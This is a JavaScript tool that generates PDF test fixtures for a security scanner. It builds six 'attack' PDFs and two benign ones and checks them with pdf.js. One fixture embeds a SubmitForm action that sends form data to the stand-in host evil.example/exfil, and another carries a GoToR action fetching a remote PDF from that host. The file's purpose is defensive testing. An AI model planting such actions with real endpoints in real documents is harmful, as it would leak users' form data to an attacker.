/**
 * v1.18.0 — PDF S16 real-fixture generator.
 *
 * Builds 6 attack + 2 benign on-disk PDF fixtures backing the v1.18.0 S16
 * kebab extraFindings — `pdf-submit-form-action`, `pdf-goto-remote-action`,
 * `pdf-richmedia-embed`, `pdf-3d-embed`, `pdf-sound-action`,
 * `pdf-movie-action`.
 *
 * The regression suite (packages/mcp/test/regression/pdf-s16-nonjs-actions.
 * test.js) is fully vi.mock-based: it stubs pdfjs-dist and synthesizes the
 * `actions` / `subtype` shapes directly. It does NOT depend on these
 * fixtures. The point of the on-disk fixtures is:
 *
 *   (a) a real-bytes manual-review surface (open in Adobe / Foxit to confirm
 *       the attack is realistic, not just synthesized);
 *   (b) parity-check fodder via PDF_STRUCT_FIXTURES extension;
 *   (c) forward-compatibility — if pdf-lib or pdfjs-dist drift in a way the
 *       mock-based test can't catch (e.g. /A action emission changes), the
 *       self-test below fails loudly during fixture regeneration.
 *
 * pdf.js v4 reality (probed 2026-06-27):
 *   - SubmitForm via Widget /A: pdf.js surfaces the annotation as
 *     subtype='Widget' but DOES NOT expose the SubmitForm action body
 *     through getAnnotations(). The attack pattern is real but the high-
 *     level pdf.js API doesn't surface it today — the mock test confirms
 *     the parser logic; the fixture is a forward-compatibility net.
 *   - GoToR via Link /A: pdf.js inlines the destination into Link's `a.url`
 *     field (with the dest fragment percent-encoded). REAL detection works
 *     when the parser is taught to read `a.actionType` — pdf.js v4 may not
 *     emit it, but the fixture is forward-compatible.
 *   - RichMedia / 3D / Sound / Movie: pdf.js surfaces the Subtype directly
 *     with a console warning "Unimplemented annotation type ..., falling
 *     back to base annotation". Detection through the parser's subtype
 *     branch works end-to-end TODAY.
 *
 * Outputs (8 fixtures):
 *   Attacks:
 *     - pdf_s16_submit_form_attack.pdf      (Widget /A SubmitForm /URL exfil)
 *     - pdf_s16_goto_remote_attack.pdf      (Link /A GoToR /F remote URL)
 *     - pdf_s16_richmedia_attack.pdf        (RichMedia annotation)
 *     - pdf_s16_3d_attack.pdf               (3D annotation)
 *     - pdf_s16_sound_attack.pdf            (Sound annotation)
 *     - pdf_s16_movie_attack.pdf            (Movie annotation)
 *   Benign:
 *     - pdf_s16_widget_no_action_benign.pdf (Widget with no /A action)
 *     - pdf_s16_plain_text_benign.pdf       (no annotations at all)
 *
 * Run:
 *   node tools/_generate_pdf_s16.js
 *
 * Guardrails:
 *   - R12: attack bodies embed an attacker-controlled URL but the parser
 *     surfaces only `sanitizeKey` output (no spaces, no brackets, ≤64 chars).
 *   - R23: this script lives under tools/; no parser code touched here.
 */

import { writeFileSync, mkdirSync, readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { createHash } from "node:crypto";
import {
  PDFDocument,
  PDFName,
  PDFString,
  PDFNumber,
  StandardFonts,
} from "pdf-lib";

const __dirname = dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = join(__dirname, "..");
const BENIGN_DIR = join(REPO_ROOT, "packages", "mcp", "test", "fixtures", "benign");
const ATTACKS_DIR = join(REPO_ROOT, "packages", "mcp", "test", "fixtures", "attacks");
mkdirSync(BENIGN_DIR, { recursive: true });
mkdirSync(ATTACKS_DIR, { recursive: true });

// ─── Helpers ────────────────────────────────────────────────────────────
async function newPdf() {
  const doc = await PDFDocument.create({ updateMetadata: false });
  const helv = await doc.embedFont(StandardFonts.Helvetica);
  const page = doc.addPage([200, 200]);
  page.drawText(".", { x: 10, y: 100, size: 12, font: helv });
  return { doc, page, helv };
}

// ─── Fixture builders ──────────────────────────────────────────────────

async function buildSubmitFormAttack() {
  const { doc, page } = await newPdf();
  const ctx = doc.context;
  const submitAction = ctx.obj({
    Type: PDFName.of("Action"),
    S: PDFName.of("SubmitForm"),
    F: ctx.obj({
      FS: PDFName.of("URL"),
      F: PDFString.of("https://evil.example/exfil"),
    }),
    Flags: PDFNumber.of(0),
  });
  const widget = ctx.obj({
    Type: PDFName.of("Annot"),
    Subtype: PDFName.of("Widget"),
    FT: PDFName.of("Btn"),
    T: PDFString.of("submitBtn"),
    Rect: [50, 50, 150, 80],
    P: page.ref,
    A: submitAction,
  });
  const widgetRef = ctx.register(widget);
  page.node.set(PDFName.of("Annots"), ctx.obj([widgetRef]));
  doc.catalog.set(PDFName.of("AcroForm"), ctx.obj({ Fields: [widgetRef] }));
  return await doc.save({ useObjectStreams: false });
}

async function buildGotoRemoteAttack() {
  const { doc, page } = await newPdf();
  const ctx = doc.context;
  const gotoR = ctx.obj({
    Type: PDFName.of("Action"),
    S: PDFName.of("GoToR"),
    F: PDFString.of("https://evil.example/other.pdf"),
    D: ctx.obj([PDFNumber.of(0), PDFName.of("XYZ"), null, null, null]),
  });
  const linkAnnot = ctx.obj({
    Type: PDFName.of("Annot"),
    Subtype: PDFName.of("Link"),
    Rect: [10, 10, 100, 50],
    P: page.ref,
    A: gotoR,
  });
  page.node.set(PDFName.of("Annots"), ctx.obj([ctx.register(linkAnnot)]));
  return await doc.save({ useObjectStreams: false });
}

async function buildSubtypeAttack(subtypeName) {
  const { doc, page } = await newPdf();
  const ctx = doc.context;
  const annot = ctx.obj({
    Type: PDFName.of("Annot"),
    Subtype: PDFName.of(subtypeName),
    Rect: [10, 10, 100, 50],
    P: page.ref,
  });
  page.node.set(PDFName.of("Annots"), ctx.obj([ctx.register(annot)]));
  return await doc.save({ useObjectStreams: false });
}

async function buildWidgetNoActionBenign() {
  const { doc, page } = await newPdf();
  const ctx = doc.context;
  const widget = ctx.obj({
    Type: PDFName.of("Annot"),
    Subtype: PDFName.of("Widget"),
    FT: PDFName.of("Tx"),
    T: PDFString.of("plainField"),
    V: PDFString.of("hello"),
    Rect: [50, 50, 150, 80],
    P: page.ref,
  });
  const widgetRef = ctx.register(widget);
  page.node.set(PDFName.of("Annots"), ctx.obj([widgetRef]));
  doc.catalog.set(PDFName.of("AcroForm"), ctx.obj({ Fields: [widgetRef] }));
  return await doc.save({ useObjectStreams: false });
}

async function buildPlainTextBenign() {
  const { doc } = await newPdf();
  return await doc.save({ useObjectStreams: false });
}

// ─── Fixture spec table ────────────────────────────────────────────────
const FIXTURES = [
  {
    out: join(ATTACKS_DIR, "pdf_s16_submit_form_attack.pdf"),
    label: "submit-a",
    build: buildSubmitFormAttack,
    selfTest: { kind: "annot-subtype", expectSubtype: "Widget", expectFieldName: "submitBtn" },
  },
  {
    out: join(ATTACKS_DIR, "pdf_s16_goto_remote_attack.pdf"),
    label: "goto-a",
    build: buildGotoRemoteAttack,
    // pdf.js v4 surfaces a Link with a.url set to the GoToR /F target.
    selfTest: { kind: "annot-link-url", expectUrlIncludes: "evil.example/other.pdf" },
  },
  {
    out: join(ATTACKS_DIR, "pdf_s16_richmedia_attack.pdf"),
    label: "rich-a",
    build: () => buildSubtypeAttack("RichMedia"),
    selfTest: { kind: "annot-subtype", expectSubtype: "RichMedia" },
  },
  {
    out: join(ATTACKS_DIR, "pdf_s16_3d_attack.pdf"),
    label: "3d-a",
    build: () => buildSubtypeAttack("3D"),
    selfTest: { kind: "annot-subtype", expectSubtype: "3D" },
  },
  {
    out: join(ATTACKS_DIR, "pdf_s16_sound_attack.pdf"),
    label: "sound-a",
    build: () => buildSubtypeAttack("Sound"),
    selfTest: { kind: "annot-subtype", expectSubtype: "Sound" },
  },
  {
    out: join(ATTACKS_DIR, "pdf_s16_movie_attack.pdf"),
    label: "movie-a",
    build: () => buildSubtypeAttack("Movie"),
    selfTest: { kind: "annot-subtype", expectSubtype: "Movie" },
  },
  {
    out: join(BENIGN_DIR, "pdf_s16_widget_no_action_benign.pdf"),
    label: "widget-b",
    build: buildWidgetNoActionBenign,
    selfTest: { kind: "annot-subtype", expectSubtype: "Widget", expectFieldName: "plainField" },
  },
  {
    out: join(BENIGN_DIR, "pdf_s16_plain_text_benign.pdf"),
    label: "plain-b",
    build: buildPlainTextBenign,
    selfTest: { kind: "no-annots" },
  },
];

// ─── Write phase ───────────────────────────────────────────────────────
const written = [];
for (const f of FIXTURES) {
  const bytes = await f.build();
  writeFileSync(f.out, bytes);
  const sha = createHash("sha256").update(bytes).digest("hex").slice(0, 16);
  written.push({ ...f, bytes: bytes.length, sha });
  console.log(`wrote ${f.label.padEnd(10)} ${f.out} (${bytes.length} bytes, sha256[0:16]=${sha})`);
}

// ─── Idempotency self-check ────────────────────────────────────────────
console.log("\n[self-test] idempotency check ...");
for (const w of written) {
  const rebuilt = await w.build();
  const onDisk = readFileSync(w.out);
  const reHash = createHash("sha256").update(rebuilt).digest("hex");
  const diskHash = createHash("sha256").update(onDisk).digest("hex");
  if (reHash !== diskHash) {
    console.error(`  FAIL idempotency: ${w.out}`);
    console.error(`    on-disk sha256: ${diskHash}`);
    console.error(`    rebuilt sha256: ${reHash}`);
    process.exit(1);
  }
  console.log(`  OK   ${w.label.padEnd(10)} bit-identical re-run`);
}

// ─── pdf.js round-trip self-check ──────────────────────────────────────
console.log("\n[self-test] pdf.js round-trip ...");
const pdfjs = await import("pdfjs-dist/legacy/build/pdf.mjs");
for (const w of written) {
  const buf = readFileSync(w.out);
  const pdf = await pdfjs.getDocument({
    data: new Uint8Array(buf),
    useSystemFonts: true,
    disableFontFace: true,
  }).promise;
  if (pdf.numPages !== 1) {
    console.error(`  FAIL numPages != 1 for ${w.out}: got ${pdf.numPages}`);
    process.exit(1);
  }
  const page = await pdf.getPage(1);
  const annots = await page.getAnnotations();

  if (w.selfTest.kind === "annot-subtype") {
    const a = annots.find((x) => x && x.subtype === w.selfTest.expectSubtype);
    if (!a) {
      console.error(`  FAIL no ${w.selfTest.expectSubtype} annot for ${w.out}`);
      console.error(`    annots subtypes: ${JSON.stringify(annots.map((x) => x.subtype))}`);
      process.exit(1);
    }
    if (w.selfTest.expectFieldName && a.fieldName !== w.selfTest.expectFieldName) {
      console.error(`  FAIL fieldName mismatch for ${w.out}: got ${a.fieldName}`);
      process.exit(1);
    }
    console.log(`  OK   ${w.label.padEnd(10)} ${w.selfTest.expectSubtype} annotation roundtripped`);
  } else if (w.selfTest.kind === "annot-link-url") {
    const a = annots.find((x) => x && x.subtype === "Link" && typeof x.url === "string");
    if (!a) {
      console.error(`  FAIL no Link with url for ${w.out}`);
      console.error(`    annots: ${JSON.stringify(annots)}`);
      process.exit(1);
    }
    if (!a.url.includes(w.selfTest.expectUrlIncludes)) {
      console.error(`  FAIL Link url missing token for ${w.out}: ${a.url}`);
      process.exit(1);
    }
    console.log(`  OK   ${w.label.padEnd(10)} Link a.url='${a.url}'`);
  } else if (w.selfTest.kind === "no-annots") {
    if (annots.length !== 0) {
      console.error(`  FAIL expected 0 annots for ${w.out}, got ${annots.length}`);
      process.exit(1);
    }
    console.log(`  OK   ${w.label.padEnd(10)} no annotations (plain benign)`);
  } else {
    console.error(`  FAIL unknown selfTest.kind for ${w.out}: ${w.selfTest.kind}`);
    process.exit(1);
  }
}

console.log("\nAll fixtures generated and self-tests green.");
